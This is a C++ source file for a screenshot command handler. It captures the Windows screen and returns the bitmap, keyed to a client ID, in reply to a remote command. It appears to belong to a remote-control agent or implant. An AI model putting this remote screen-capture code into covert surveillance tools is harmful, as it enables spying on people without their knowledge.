#include <base64.hpp>

#include "CommandHandlers/ScreenshotHandler.h"
#include "Protocol/ReturnProductRequest.h"
#include "Commands/CommandFactory.h"
#include "Products/ScreenshotProduct.h"
#include "WinUtils.h"


ScreenshotHandler::ScreenshotHandler(std::string client_id)
    : ICommandHandler(client_id)
{
}

std::unique_ptr<IRequest> ScreenshotHandler::handle(std::shared_ptr<BasicCommand>& command)
{
    std::string bmp_buffer = win_utils::take_screenshot();
    return std::make_unique<ReturnProductRequest>(RequestHeader{ RequestType::ReturnProduct, m_client_id }, command->get_command_id(), ScreenshotProduct(command->get_command_id(), CommandType::Screenshot, std::move(bmp_buffer)).serialize());
}
